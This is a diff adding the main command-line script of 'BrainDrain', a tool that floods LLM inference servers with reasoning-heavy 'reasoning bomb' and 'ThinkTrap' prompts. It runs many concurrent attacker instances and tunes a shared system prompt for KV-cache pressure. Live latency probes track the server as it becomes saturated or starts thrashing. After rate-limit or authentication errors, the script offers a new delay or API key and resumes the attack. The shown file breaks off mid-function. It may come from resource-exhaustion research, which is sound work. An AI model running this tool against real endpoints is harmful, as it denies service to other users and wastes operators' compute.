@@ -1,0 +1,1141 @@
+#!/usr/bin/env python3
+"""
+cli.py — BrainDrain unified attack CLI.
+
+Interactive wizard → baseline probe → sustained attack with live probe monitoring.
+
+Usage:
+    python cli.py
+"""
+from __future__ import annotations
+
+import asyncio
+import logging
+import sys
+import time
+from typing import Any, Callable, Optional
+
+import aiohttp
+
+from core.base_attack import APIFormat, AttackStatus, BaseAttack, TargetConfig
+from attacks.reasoning_bomb import ReasoningBombAttack, ReasoningBombConfig, PuzzleLoader
+from attacks.think_trap import ThinkTrapAttack, ThinkTrapConfig
+from orchestration.attacker_instance import AttackerInstance, AttackerInstanceConfig
+from orchestration.registry import make_config_factory
+from orchestration.result_collector import ResultCollector
+from probes.itl_probes import InfraState, ITLProbes, ProbeConfig
+
+try:
+    from rich.console import Console
+    from rich.table import Table
+    from rich.live import Live
+    from rich.panel import Panel
+    from rich.text import Text
+    from rich import box
+    _RICH = True
+except ImportError:
+    _RICH = False
+
+console = Console() if _RICH else None
+
+# ─────────────────────────────────────────────
+# Logging setup
+# ─────────────────────────────────────────────
+
+def _setup_logging() -> None:
+    """Route library warnings/errors to the terminal so silent failures are visible."""
+    if _RICH:
+        from rich.logging import RichHandler
+        logging.basicConfig(
+            level=logging.WARNING,
+            format="%(message)s",
+            handlers=[RichHandler(console=console, show_path=False, markup=False)],
+        )
+    else:
+        logging.basicConfig(
+            level=logging.WARNING,
+            format="[%(name)s] %(levelname)s: %(message)s",
+        )
+
+
+# ─────────────────────────────────────────────
+# Helpers
+# ─────────────────────────────────────────────
+
+def _print(msg: str, style: str = "") -> None:
+    if _RICH and console:
+        console.print(msg, style=style)
+    else:
+        print(msg)
+
+
+def _ask(prompt: str, default: Optional[str] = None) -> str:
+    """Prompt the user; return stripped input or default if blank."""
+    suffix = f" [{default}]" if default is not None else ""
+    try:
+        val = input(f"  {prompt}{suffix}: ").strip()
+    except (EOFError, KeyboardInterrupt):
+        print()
+        sys.exit(0)
+    return val if val else (default or "")
+
+
+def _ask_int(prompt: str, default: int, min_val: int = 1) -> int:
+    while True:
+        raw = _ask(prompt, str(default))
+        try:
+            v = int(raw)
+            if v >= min_val:
+                return v
+            _print(f"    Value must be >= {min_val}.", "yellow")
+        except ValueError:
+            _print("    Please enter an integer.", "yellow")
+
+
+
+def _choose(prompt: str, options: list[str], default: str) -> str:
+    opts_str = " / ".join(
+        f"[bold]{o}[/bold]" if o == default else o for o in options
+    ) if _RICH else " / ".join(options)
+    while True:
+        raw = _ask(f"{prompt} ({opts_str})", default)
+        if raw.lower() in [o.lower() for o in options]:
+            return raw.lower()
+        _print(f"    Choose one of: {', '.join(options)}", "yellow")
+
+
+async def _ask_async(prompt: str, default: Optional[str] = None) -> str:
+    """Non-blocking input() using run_in_executor so the event loop isn't blocked."""
+    suffix = f" [{default}]" if default is not None else ""
+    loop = asyncio.get_event_loop()
+    raw = await loop.run_in_executor(None, input, f"  {prompt}{suffix}: ")
+    raw = raw.strip()
+    return raw if raw else (default or "")
+
+
+# ─────────────────────────────────────────────
+# Error classification
+# ─────────────────────────────────────────────
+
+# After this many consecutive FAILED results with the same category, pause and prompt.
+RECOVERY_CONSECUTIVE = 10
+
+def _classify_error(error: str) -> Optional[str]:
+    """
+    Map an error message to a recoverable category.
+    Returns None if the error is unclassified / likely transient.
+    """
+    low = error.lower()
+    if any(k in low for k in (
+        "context length", "context window", "maximum context",
+        "max_tokens", "max tokens", "token limit", "tokens exceed",
+        "maximum length", "exceeds the maximum", "this model's maximum",
+        "input is too long", "input length", "sequence length",
+    )):
+        return "token_limit"
+    if any(k in low for k in (
+        "http 401", "http 403", "unauthorized", "forbidden",
+        "invalid api key", "authentication", "api key",
+    )):
+        return "auth"
+    if any(k in low for k in (
+        "http 404", "not found", "no such model",
+        "model not found", "model does not exist",
+    )):
+        return "model_not_found"
+    if any(k in low for k in (
+        "http 429", "rate limit", "too many requests",
+        "quota exceeded", "rate_limit",
+    )):
+        return "rate_limit"
+    return None
+
+
+# ─────────────────────────────────────────────
+# Auto-detect max tokens from API
+# ─────────────────────────────────────────────
+
+async def try_fetch_context_length(target: TargetConfig) -> Optional[int]:
+    """
+    Try to discover the model's context window from the API.
+    Queries /v1/models/{model} for OpenAI-compatible endpoints.
+    Returns the context_window int, or None if unavailable.
+    """
+    url = f"{target.base_url.rstrip('/')}/v1/models/{target.model}"
+    headers = {"Content-Type": "application/json", **target.auth_headers}
+    try:
+        timeout = aiohttp.ClientTimeout(total=8.0)
+        async with aiohttp.ClientSession(timeout=timeout) as session:
+            async with session.get(url, headers=headers, ssl=target.verify_ssl) as resp:
+                if resp.status == 200:
+                    data = await resp.json()
+                    # vLLM and some OpenAI-compat APIs expose max_model_len
+                    for key in ("max_model_len", "context_window", "context_length"):
+                        if key in data:
+                            return int(data[key])
+    except Exception:
+        pass
+    return None
+
+
+# ─────────────────────────────────────────────
+# Wizard: gather configs
+# ─────────────────────────────────────────────
+
+def gather_target_config() -> TargetConfig:
+    _print("\n[bold cyan]── Target Configuration ──[/bold cyan]" if _RICH else "\n── Target Configuration ──")
+
+    base_url = _ask("Target URL / IP (e.g. http://1.2.3.4 or https://api.example.com)")
+    if not base_url.startswith("http"):
+        base_url = "http://" + base_url
+
+    model = _ask("Model name (e.g. deepseek-r1-7b, gpt-4o)")
+
+    fmt_str = _choose(
+        "API format",
+        ["openai", "anthropic", "ollama", "custom"],
+        "openai",
+    )
+    fmt_map = {
+        "openai":    APIFormat.OPENAI,
+        "anthropic": APIFormat.ANTHROPIC,
+        "ollama":    APIFormat.OLLAMA,
+        "custom":    APIFormat.CUSTOM,
+    }
+    api_format = fmt_map[fmt_str]
+
+    api_key_raw = _ask("API key (leave blank if not required)")
+    api_key = api_key_raw if api_key_raw else None
+
+    timeout_s = float(_ask("Request timeout (seconds)", "300"))
+
+    supports_stream_options = True
+    if api_format in (APIFormat.OLLAMA, APIFormat.CUSTOM):
+        raw = _ask("Server supports stream_options (OpenAI >=1.x)? (y/n)", "y")
+        supports_stream_options = raw.lower().startswith("y")
+
+    _print(
+        "\n  [dim]System prompt — sent with every attack request. "
+        "A shared prefix pins concurrent requests to the same KV-cache slot, "
+        "maximising cache pressure (prefix-aware routing). Leave blank to omit.[/dim]"
+        if _RICH else
+        "\n  System prompt — sent with every attack request. A shared prefix pins "
+        "concurrent requests to the same KV-cache slot (prefix-aware routing). "
+        "Leave blank to omit."
+    )
+    system_prompt_raw = _ask("System prompt (leave blank to omit)")
+    system_prompt = system_prompt_raw if system_prompt_raw else None
+
+    return TargetConfig(
+        base_url=base_url,
+        model=model,
+        api_format=api_format,
+        api_key=api_key,
+        timeout=timeout_s,
+        supports_stream_options=supports_stream_options,
+        system_prompt=system_prompt,
+    )
+
+
+def gather_attack_params(target: TargetConfig) -> dict:
+    _print("\n[bold cyan]── Attack Configuration ──[/bold cyan]" if _RICH else "\n── Attack Configuration ──")
+
+    attack_type = _choose(
+        "Attack type",
+        ["reasoning_bomb", "think_trap"],
+        "reasoning_bomb",
+    )
+
+    n_instances = _ask_int("Number of concurrent attacker instances", default=4)
+
+    _print("\n  [dim]Token budget: total tokens (completion + reasoning) the attack may generate.[/dim]" if _RICH
+           else "\n  Token budget: total tokens (completion + reasoning) the attack may generate.")
+    budget_raw = _ask("Token budget (leave blank for unlimited)")
+    token_budget: Optional[int] = None
+    if budget_raw:
+        try:
+            token_budget = int(budget_raw)
+        except ValueError:
+            pass
+
+    # max_tokens per request
+    _print("  [dim]Trying to auto-detect context length from API…[/dim]" if _RICH
+           else "  Trying to auto-detect context length from API…")
+    detected = asyncio.run(_fetch_context_length_safe(target))
+    if detected:
+        _print(f"  [green]Detected context window: {detected:,} tokens[/green]" if _RICH
+               else f"  Detected context window: {detected:,} tokens")
+        default_max = min(detected, 32768)
+    else:
+        _print("  [yellow]Could not detect context length from API.[/yellow]" if _RICH
+               else "  Could not detect context length from API.")
+        default_max = 16384
+
+    max_tokens = _ask_int(
+        "Max tokens per request (max_completion_tokens)",
+        default=default_max,
+    )
+
+    extra: dict[str, Any] = {}
+
+    if attack_type == "reasoning_bomb":
+        puzzle_file = _ask("Path to puzzle JSON file", "prompts/reasoningBomb_puzzles.json")
+        budget_tier = _choose("Puzzle budget tier", ["128", "256", "512"], "256")
+        extra["puzzle_file"] = puzzle_file
+        extra["budget_tier"] = budget_tier
+
+    elif attack_type == "think_trap":
+        prompts_file = _ask("Path to ThinkTrap prompts JSON file", "prompts/thinktrap_prompts.json")
+        extra["prompts_file"] = prompts_file
+
+    return {
+        "attack_type":   attack_type,
+        "n_instances":   n_instances,
+        "token_budget":  token_budget,
+        "max_tokens":    max_tokens,
+        "extra":         extra,
+    }
+
+
+async def _fetch_context_length_safe(target: TargetConfig) -> Optional[int]:
+    try:
+        return await try_fetch_context_length(target)
+    except Exception:
+        return None
+
+
+# ─────────────────────────────────────────────
+# Build attack factory
+# ─────────────────────────────────────────────
+
+def build_attack_factory(
+    attack_type: str,
+    target: TargetConfig,
+    max_tokens: int,
+    extra: dict,
+    n_puzzles: Optional[int] = None,
+    instance_index: int = 0,
+) -> tuple[type[BaseAttack], Callable, dict]:
+    """
+    Returns (attack_cls, config_factory, extra_kwargs) for one instance.
+    For reasoning_bomb, each instance gets a distinct puzzle index so
+    concurrent requests don't share a prompt (avoids prefix-cache bypass).
+    """
+    config_factory = make_config_factory(target, max_tokens=max_tokens)
+
+    if attack_type == "reasoning_bomb":
+        puzzle_file  = extra.get("puzzle_file", "prompts/reasoningBomb_puzzles.json")
+        budget_tier  = extra.get("budget_tier", "256")
+        puzzle_index = instance_index % n_puzzles if n_puzzles else None
+        rb_cfg = ReasoningBombConfig(
+            puzzle_file=puzzle_file,
+            budget_tier=budget_tier,
+            puzzle_index=puzzle_index,
+        )
+        return ReasoningBombAttack, config_factory, {"rb_config": rb_cfg}
+
+    elif attack_type == "think_trap":
+        prompts_file = extra.get("prompts_file", "prompts/thinktrap_prompts.json")
+        tt_cfg = ThinkTrapConfig(prompts_file=prompts_file)
+        return ThinkTrapAttack, config_factory, {"tt_config": tt_cfg}
+
+    raise ValueError(f"Unknown attack type: {attack_type!r}")
+
+
+# ─────────────────────────────────────────────
+# Live status display
+# ─────────────────────────────────────────────
+
+class StatusDisplay:
+    """Lightweight live status panel (rich or plain)."""
+
+    def __init__(self) -> None:
+        self._start         = time.time()
+        self._state         = InfraState.UNKNOWN
+        self._kv_est        = -1.0
+        self._itl_ms        = 0.0
+        self._ttft_s        = 0.0
+        self._requests      = 0
+        self._output_tokens = 0   # completion + reasoning tokens (used for budget)
+        self._input_tokens  = 0   # prompt tokens
+        self._budget        = None
+        self._instances: int = 0
+        self._errors        = 0
+        self._last_error    = ""
+
+    def update(
+        self,
+        *,
+        state: Optional[InfraState] = None,
+        kv_est: Optional[float] = None,
+        itl_ms: Optional[float] = None,
+        ttft_s: Optional[float] = None,
+        requests: Optional[int] = None,
+        output_tokens: Optional[int] = None,
+        input_tokens: Optional[int] = None,
+        budget: Optional[int] = None,
+        instances: Optional[int] = None,
+        errors: Optional[int] = None,
+        last_error: Optional[str] = None,
+    ) -> None:
+        if state         is not None: self._state         = state
+        if kv_est        is not None: self._kv_est        = kv_est
+        if itl_ms        is not None: self._itl_ms        = itl_ms
+        if ttft_s        is not None: self._ttft_s        = ttft_s
+        if requests      is not None: self._requests      = requests
+        if output_tokens is not None: self._output_tokens = output_tokens
+        if input_tokens  is not None: self._input_tokens  = input_tokens
+        if budget        is not None: self._budget        = budget
+        if instances     is not None: self._instances     = instances
+        if errors        is not None: self._errors        = errors
+        if last_error    is not None: self._last_error    = last_error
+
+    def render(self) -> Any:
+        elapsed = time.time() - self._start
+        kv_str = f"{self._kv_est:.3f}" if self._kv_est >= 0 else "n/a"
+        out_str = (
+            f"{self._output_tokens:,} / {self._budget:,}"
+            if self._budget else f"{self._output_tokens:,}"
+        )
+        state_color = {
+            InfraState.UNKNOWN:     "white",
+            InfraState.IDLE:        "green",
+            InfraState.FILLING:     "yellow",
+            InfraState.SATURATED:   "red",
+            InfraState.HOL_BLOCKED: "red",
+            InfraState.THRASHING:   "magenta",
+            InfraState.DEGRADED:    "orange3",
+        }.get(self._state, "white")
+
+        if _RICH:
+            t = Table.grid(padding=(0, 2))
+            t.add_column(style="dim", width=22)
+            t.add_column()
+            t.add_row("Elapsed",       f"{elapsed:.0f}s")
+            t.add_row("Instances",     str(self._instances))
+            t.add_row("Requests",      str(self._requests))
+            t.add_row("Output tokens", out_str)
+            t.add_row("Input tokens",  f"{self._input_tokens:,}")
+            t.add_row("Infra state",   Text(self._state.value, style=state_color))
+            t.add_row("KV est",      kv_str)
+            t.add_row("Mean ITL",    f"{self._itl_ms:.1f} ms")
+            t.add_row("TTFT",        f"{self._ttft_s:.3f} s")
+            if self._errors:
+                err_text = Text(f"{self._errors} failed", style="red")
+                t.add_row("Errors", err_text)
+                if self._last_error:
+                    # Truncate to fit panel width
+                    short = self._last_error[:60] + ("…" if len(self._last_error) > 60 else "")
+                    t.add_row("Last error", Text(short, style="red dim"))
+            return Panel(t, title="[bold]BrainDrain[/bold]", border_style="cyan")
+        else:
+            err_str = f" err={self._errors}" if self._errors else ""
+            print(
+                f"\r  [{elapsed:.0f}s] "
+                f"inst={self._instances} reqs={self._requests} "
+                f"out={out_str} in={self._input_tokens:,} "
+                f"state={self._state.value} "
+                f"kv={kv_str} itl={self._itl_ms:.1f}ms ttft={self._ttft_s:.3f}s{err_str}",
+                end="", flush=True,
+            )
+            return None
+
+
+# ─────────────────────────────────────────────
+# Orchestrator
+# ─────────────────────────────────────────────
+
+class AttackOrchestrator:
+    """
+    Coordinates sustained attack instances + probe monitoring.
+
+    Flow:
+    1. calibrate_baseline()
+    2. Launch N run_loop instances
+    3. Run probe monitor in parallel (updates status + state timeline)
+    4. Watch token budget — set stop_event when budget exhausted
+    5. Watchdog: if an instance's task dies unexpectedly, restart it
+    6. On Ctrl+C or budget exhaustion: stop cleanly and print summary
+    """
+
+    PROBE_INTERVAL_S = 10.0   # how often to fire a probe during the attack
+    WATCHDOG_INTERVAL_S = 5.0 # how often to check for dead instances
+
+    def __init__(
+        self,
+        target:        TargetConfig,
+        attack_type:   str,
+        n_instances:   int,
+        max_tokens:    int,
+        token_budget:  Optional[int],
+        attack_extra:  dict,
+    ) -> None:
+        self.target       = target
+        self.attack_type  = attack_type
+        self.n_instances  = n_instances
+        self.max_tokens   = max_tokens
+        self.token_budget = token_budget
+        self.attack_extra = attack_extra
+
+        self._stop   = asyncio.Event()
+        self._queue:  asyncio.Queue = asyncio.Queue()
+        self._collector = ResultCollector()
+        self._display   = StatusDisplay()
+        self._probes:   Optional[ITLProbes] = None
+        self._instances: list[AttackerInstance] = []
+        self._tasks:    list[asyncio.Task] = []
+
+        # Inter-request delay (adjustable via rate_limit recovery)
+        self._inter_request_delay: float = 0.0
+
+        # Recovery state
+        self._recovering              = False
+        self._recovery_triggered      = asyncio.Event()
+        self._recovery_error:   str   = ""
+        self._recovery_category: str  = ""
+        self._consecutive_failures    = 0
+
+        # Live display handle (set during run())
+        self._live:         Optional[Any]            = None
+        self._refresh_task: Optional[asyncio.Task]  = None
+
+        # puzzle pool size for reasoning_bomb (for distinct puzzle per instance)
+        self._pool_size: Optional[int] = None
+        if attack_type == "reasoning_bomb":
+            try:
+                pf  = attack_extra.get("puzzle_file", "prompts/reasoningBomb_puzzles.json")
+                bt  = attack_extra.get("budget_tier", "256")
+                ldr = PuzzleLoader(pf)
+                self._pool_size = ldr.count(bt)
+            except Exception:
+                pass
+
+    # ── Probe setup ───────────────────────────────────────────────────
+
+    def _build_probes(self) -> ITLProbes:
+        cfg = ProbeConfig(
+            target=self.target,
+            max_probe_tokens=128,
+            temperature=0.0,
+            baseline_window=5,
+            burst_concurrency=4,
+            rolling_window=20,
+            itl_fill_threshold=1.5,
+            itl_saturated_threshold=3.0,
+            ttft_hol_threshold=5.0,
+            itl_cv_thrash_threshold=0.5,
+            regressor_backend="linear",
+            baseline_cache_path="probes/results/baseline_cache.json",
+            history_path="probes/results/probe_history.jsonl",
+        )
+        return ITLProbes(cfg)
+
+    # ── Instance factory ──────────────────────────────────────────────
+
+    def _make_instance(self, index: int) -> AttackerInstance:
+        cls, factory, extra_kw = build_attack_factory(
+            self.attack_type,
+            self.target,
+            self.max_tokens,
+            self.attack_extra,
+            n_puzzles=self._pool_size,
+            instance_index=index,
+        )
+        cfg = AttackerInstanceConfig(
+            attack_cls=cls,
+            attack_config_factory=factory,
+            attack_extra_kwargs=extra_kw,
+        )
+        return AttackerInstance(cfg)
+
+    # ── Pre-flight connectivity check ────────────────────────────────
+
+    async def preflight_check(self) -> bool:
+        """
+        Fire one attack request with a tiny token budget to verify:
+          - endpoint is reachable
+          - payload format is accepted (HTTP 2xx)
+          - puzzle/prompts file can be loaded
+
+        Returns True if OK, False if the request failed.
+        Prints the error so the user can act before launching N instances.
+        """
+        _print(
+            "  [dim]Pre-flight: firing one test request…[/dim]"
+            if _RICH else
+            "  Pre-flight: firing one test request…"
+        )
+        # Use small max_tokens just to get a quick response
+        from orchestration.registry import make_config_factory as _mcf
+        factory = _mcf(self.target, max_tokens=64)
+
+        try:
+            cls, _, extra_kw = build_attack_factory(
+                self.attack_type, self.target, 64, self.attack_extra,
+                n_puzzles=self._pool_size, instance_index=0,
+            )
+            attack = cls(factory(), **extra_kw)
+        except Exception as exc:
+            _print(
+                f"  [bold red]Pre-flight FAILED (init): {exc}[/bold red]"
+                if _RICH else
+                f"  Pre-flight FAILED (init): {exc}"
+            )
+            return False
+
+        try:
+            result = await attack.run()
+        except Exception as exc:
+            _print(
+                f"  [bold red]Pre-flight FAILED (request): {exc}[/bold red]"
+                if _RICH else
+                f"  Pre-flight FAILED (request): {exc}"
+            )
+            return False
+        finally:
+            await attack.close()
+
+        if result.status == AttackStatus.FAILED:
+            _print(
+                f"  [bold red]Pre-flight FAILED: {result.error}[/bold red]"
+                if _RICH else
+                f"  Pre-flight FAILED: {result.error}"
+            )
+            return False
+
+        _print(
+            f"  [green]Pre-flight OK — "
+            f"{result.token_metrics.completion_tokens} tokens in "
+            f"{result.latency_metrics.total_duration_s:.1f}s[/green]"
+            if _RICH else
+            f"  Pre-flight OK — "
+            f"{result.token_metrics.completion_tokens} tokens in "
+            f"{result.latency_metrics.total_duration_s:.1f}s"
+        )
+        return True
+
+    # ── Baseline calibration ──────────────────────────────────────────
+
+    async def run_baseline(self) -> None:
+        _print("\n[bold cyan]── Baseline Calibration ──[/bold cyan]" if _RICH
+               else "\n── Baseline Calibration ──")
+        _print("  Running 5 probe requests against idle server…")
+
+        self._probes = self._build_probes()
+
+        # Always run a fresh calibration — never rely on a cached value,
+        # since the server state may have changed since the last run.
+        result = await self._probes.calibrate_baseline(
+            n_samples=5, warm_up=1, inter_delay_s=0.5
+        )
+        itl  = result.get("baseline_itl_ms", 0.0)
+        ttft = result.get("baseline_ttft_s", 0.0)
+        kv   = result.get("baseline_kv_est",  0.0)
+        _print(
+            f"  [green]Baseline: ITL={itl:.2f} ms  TTFT={ttft:.4f} s  "
+            f"KV(idle)={kv:.4f}[/green]"
+            if _RICH else
+            f"  Baseline: ITL={itl:.2f} ms  TTFT={ttft:.4f} s  KV(idle)={kv:.4f}"
+        )
+
+    # ── Budget watcher ────────────────────────────────────────────────
+
+    async def _budget_watcher(self) -> None:
+        """Sets stop_event when the token budget is exhausted."""
+        if self.token_budget is None:
+            return
+        while not self._stop.is_set():
+            generated = (
+                self._collector._results and
+                sum(
+                    r.token_metrics.completion_tokens + r.token_metrics.reasoning_tokens
+                    for r in self._collector._results
+                )
+            ) or 0
+            if generated >= self.token_budget:
+                _print(
+                    f"\n  [bold yellow]Token budget exhausted "
+                    f"({generated:,} / {self.token_budget:,}). Stopping.[/bold yellow]"
+                    if _RICH else
+                    f"\n  Token budget exhausted ({generated:,} / {self.token_budget:,}). Stopping."
+                )
+                self._stop.set()
+                return
+            await asyncio.sleep(2.0)
+
+    # ── Instance watchdog ─────────────────────────────────────────────
+
+    async def _instance_watchdog(self) -> None:
+        """
+        Monitors running instance tasks. If a task dies unexpectedly and
+        the stop event hasn't fired (budget remains, no saturation),
+        a replacement instance is spawned.
+        """
+        while not self._stop.is_set():
+            await asyncio.sleep(self.WATCHDOG_INTERVAL_S)
+            for i, task in enumerate(list(self._tasks)):
+                if task.done() and not self._stop.is_set():
+                    exc = task.exception() if not task.cancelled() else None
+                    if exc:
+                        _print(
+                            f"\n  [yellow]Instance task {i} died: {exc}. Restarting.[/yellow]"
+                            if _RICH else
+                            f"\n  Instance task {i} died: {exc}. Restarting."
+                        )
+                    inst = self._make_instance(len(self._instances))
+                    self._instances.append(inst)
+                    new_task = asyncio.create_task(
+                        inst.run_loop(self._queue, self._stop)
+                    )
+                    self._tasks[i] = new_task
+
+    # ── Probe monitor ──────────────────────────────────────────────────
+
+    async def _probe_monitor(self) -> None:
+        """
+        Periodically fires probes and updates the live display.
+        Also records state transitions for the final summary.
+        """
+        if self._probes is None:
+            return
+
+        def on_probe(result, state: InfraState) -> None:
+            self._display.update(
+                state=state,
+                kv_est=result.kv_usage_est,
+                itl_ms=result.mean_itl_ms,
+                ttft_s=result.ttft_s,
+            )
+            self._collector.record_state(state)
+
+        def on_state_change(old: InfraState, new: InfraState) -> None:
+            _print(
+                f"\n  [bold]State change: {old.value} → {new.value}[/bold]"
+                if _RICH else
+                f"\n  State change: {old.value} → {new.value}"
+            )
+
+        await self._probes.monitor(
+            interval_s=self.PROBE_INTERVAL_S,
+            on_probe=on_probe,
+            on_state_change=on_state_change,
+            stop_event=self._stop,
+        )
+
+    # ── Display refresh ───────────────────────────────────────────────
+
+    async def _refresh_display(self) -> None:
+        while not self._stop.is_set() and not self._recovering:
+            results = self._collector._results
+            output_tok = sum(
+                r.token_metrics.completion_tokens + r.token_metrics.reasoning_tokens
+                for r in results
+            )
+            input_tok = sum(r.token_metrics.prompt_tokens for r in results)
+            self._display.update(
+                requests=len(results),
+                output_tokens=output_tok,
+                input_tokens=input_tok,
+                budget=self.token_budget,
+                instances=len(self._instances),
+            )
+            if _RICH and self._live:
+                self._live.update(self._display.render())
+            elif not _RICH:
+                self._display.render()
+            await asyncio.sleep(1.0)
+
+    # ── Error recovery ────────────────────────────────────────────────
+
+    async def _error_watcher(self) -> None:
+        """Waits for the recovery trigger, then hands off to _trigger_recovery."""
+        while not self._stop.is_set():
+            try:
+                await asyncio.wait_for(self._recovery_triggered.wait(), timeout=1.0)
+            except asyncio.TimeoutError:
+                continue
+            if self._stop.is_set():
+                break
+            self._recovery_triggered.clear()
+            await self._trigger_recovery(self._recovery_category, self._recovery_error)
+
+    async def _trigger_recovery(self, category: str, sample_error: str) -> None:
+        """
+        Pause instances, prompt user to fix the config, then restart.
+
+        Runs entirely inside the existing event loop — the probe monitor and
+        collector keep running while we wait for user input.
+        """
+        if self._recovering:
+            return
+        self._recovering = True
+
+        # ── Stop the Live display so input() isn't overwritten ────────
+        if _RICH and self._live:
+            self._live.stop()
+        if self._refresh_task and not self._refresh_task.done():
+            self._refresh_task.cancel()
+            await asyncio.gather(self._refresh_task, return_exceptions=True)
+
+        _print("\n")
+        if _RICH:
+            console.rule("[bold red]Attack Paused — Recoverable Error[/bold red]")
+        else:
+            print("=" * 60)
+            print("  Attack Paused — Recoverable Error")
+            print("=" * 60)
+
+        _print(
+            f"\n  [bold red]Error category :[/bold red] {category}\n"
+            f"  [dim]Sample error   : {sample_error[:120]}[/dim]\n"
+            if _RICH else
+            f"\n  Error category : {category}\n"
+            f"  Sample error   : {sample_error[:120]}\n"
+        )
+
+        # ── Cancel all running instance tasks ─────────────────────────
+        for task in self._tasks:
+            task.cancel()
+        await asyncio.gather(*self._tasks, return_exceptions=True)
+        self._tasks.clear()
+
+        # ── Per-category prompt ───────────────────────────────────────
+        LABELS = {
+            "token_limit":   "Max tokens per request",
+            "auth":          "API key",
+            "model_not_found": "Model name",
+            "rate_limit":    "Delay between requests (seconds)",
+        }
+        label = LABELS.get(category, "Unknown error")
+
+        if category == "token_limit":
+            _print(
+                f"  The model rejected [bold]{self.max_tokens:,}[/bold] max_tokens.\n"
+                f"  Lower it below the model's context window.\n"
+                if _RICH else
+                f"  The model rejected {self.max_tokens:,} max_tokens.\n"
+                f"  Lower it below the model's context window.\n"
+            )
+            raw = await _ask_async(f"New {label}", str(self.max_tokens))
+            try:
+                new_val = int(raw)
+                if new_val > 0:
+                    self.max_tokens = new_val
+                    _print(
+                        f"  [green]max_tokens updated → {self.max_tokens:,}[/green]"
+                        if _RICH else
+                        f"  max_tokens updated → {self.max_tokens:,}"
+                    )
+            except ValueError:
+                _print("  Invalid value — keeping current setting.", "yellow")
+
+        elif category == "auth":
+            raw = await _ask_async(f"New {label} (leave blank to keep current)")
+            if raw:
+                self.target = self.target.__class__(
+                    **{**self.target.__dict__, "api_key": raw}
+                )
+                _print("  [green]API key updated.[/green]" if _RICH else "  API key updated.")
+
+        elif category == "model_not_found":
+            raw = await _ask_async(f"New {label}", self.target.model)
+            if raw and raw != self.target.model:
+                # TargetConfig is a dataclass — rebuild with new model
+                import dataclasses
+                self.target = dataclasses.replace(self.target, model=raw)
+                _print(
+                    f"  [green]Model updated → {self.target.model}[/green]"
+                    if _RICH else
+                    f"  Model updated → {self.target.model}"
+                )
+
+        elif category == "rate_limit":
+            raw = await _ask_async(f"New {label}", "1.0")
+            try:
+                delay = float(raw)
+                # Propagate to new instances via a stored attribute
+                self._inter_request_delay = max(0.0, delay)
+                _print(
+                    f"  [green]Inter-request delay → {self._inter_request_delay:.1f}s[/green]"
+                    if _RICH else
+                    f"  Inter-request delay → {self._inter_request_delay:.1f}s"
+                )
+            except ValueError:
+                _print("  Invalid value — keeping 0s delay.", "yellow")
+
+        # ── Ask whether to continue ───────────────────────────────────
+        action = await _ask_async("Continue attack? (y/n)", "y")
+        if action.lower() not in ("y", "yes"):
+            _print("  Stopping." if not _RICH else "  [yellow]Stopping.[/yellow]")
+            self._stop.set()
+            self._recovering = False
+            return
+
+        # ── Clear error history from the previous bad run ────────────
+        self._consecutive_failures = 0
+        self._collector._results = [
+            r for r in self._collector._results
+            if r.status != AttackStatus.FAILED
+        ]
+        self._display.update(errors=0, last_error="")
+
+        # ── Restart instances with updated config ─────────────────────
+        self._instances = []
+        for i in range(self.n_instances):
+            self._instances.append(self._make_instance(i))
+
+        for inst in self._instances:
+            task = asyncio.create_task(
+                inst.run_loop(
+                    self._queue, self._stop,
+                    inter_request_delay_s=self._inter_request_delay,
+                )
+            )
+            self._tasks.append(task)
+
+        _print(
+            f"\n  [green]Restarted {self.n_instances} instances with "
+            f"max_tokens={self.max_tokens:,}.[/green]\n"
+            if _RICH else
+            f"\n  Restarted {self.n_instances} instances with "
+            f"max_tokens={self.max_tokens:,}.\n"
+        )
+
+        # ── Restart Live display ──────────────────────────────────────
+        if _RICH and self._live:
+            self._live.start()
+        self._refresh_task = asyncio.create_task(self._refresh_display())
+
+        self._recovering = False
+
+    # ── Collector task ────────────────────────────────────────────────
+
+    async def _collect(self) -> None:
+        """Drain the result queue, surface FAILED results, and trigger recovery."""
+        while not self._stop.is_set() or not self._queue.empty():
+            try:
+                result = await asyncio.wait_for(self._queue.get(), timeout=0.25)
+                self._collector._results.append(result)
+                self._queue.task_done()
+
+                if result.status == AttackStatus.FAILED and result.error:
+                    n_failed = sum(
+                        1 for r in self._collector._results
+                        if r.status == AttackStatus.FAILED
+                    )
+                    self._display.update(errors=n_failed, last_error=result.error)
+                    self._consecutive_failures += 1
+
+                    # Only print the first occurrence of each distinct error to avoid spam
+                    all_errors = [
+                        r.error for r in self._collector._results
+                        if r.status == AttackStatus.FAILED and r.error
+                    ]
+                    if all_errors.count(result.error) == 1:
+                        _print(
+                            f"\n  [red][attack error][/red] {result.error}"
+                            if _RICH else
+                            f"\n  [attack error] {result.error}"
+                        )
+
+                    # Trigger recovery once we have enough consecutive failures
+                    # with a classifiable, actionable error.
+                    if (
+                        self._consecutive_failures >= RECOVERY_CONSECUTIVE
+                        and not self._recovering
+                        and not self._recovery_triggered.is_set()
+                    ):
+                        category = _classify_error(result.error)
+                        if category:
+                            self._recovery_error    = result.error
+                            self._recovery_category = category
+                            self._recovery_triggered.set()
+                else:
+                    self._consecutive_failures = 0
+
+            except asyncio.TimeoutError:
+                continue
+
+    # ── Main run ──────────────────────────────────────────────────────
+
+    async def run(self) -> None:
+        # Step 1 — baseline
+        await self.run_baseline()
+
+        # Step 2 — pre-flight (verify endpoint + payload before launching N instances)
+        ok = await self.preflight_check()
+        if not ok:
+            _print(
+                "\n  [bold red]Pre-flight failed. Fix the error above then retry.[/bold red]"
+                if _RICH else
+                "\n  Pre-flight failed. Fix the error above then retry."
+            )
+            return
+
+        sp_display = (
+            f'"{self.target.system_prompt[:60]}{"…" if len(self.target.system_prompt) > 60 else ""}"'
+            if self.target.system_prompt else "none"
+        )
+        _print(
+            f"\n[bold cyan]── Launching Attack ──[/bold cyan]\n"
+            f"  Type         : {self.attack_type}\n"
+            f"  Instances    : {self.n_instances}\n"
+            f"  Max tokens   : {self.max_tokens:,} per request\n"
+            f"  Budget       : {f'{self.token_budget:,}' if self.token_budget else 'unlimited'}\n"
+            f"  System prompt: {sp_display}\n"
+            f"  Press [bold]Ctrl+C[/bold] to stop.\n"
+            if _RICH else
+            f"\n── Launching Attack ──\n"
+            f"  Type         : {self.attack_type}\n"
+            f"  Instances    : {self.n_instances}\n"
+            f"  Max tokens   : {self.max_tokens:,} per request\n"
+            f"  Budget       : {f'{self.token_budget:,}' if self.token_budget else 'unlimited'}\n"
+            f"  System prompt: {sp_display}\n"
+            f"  Press Ctrl+C to stop.\n"
+        )
+
+        # Step 2 — create instances
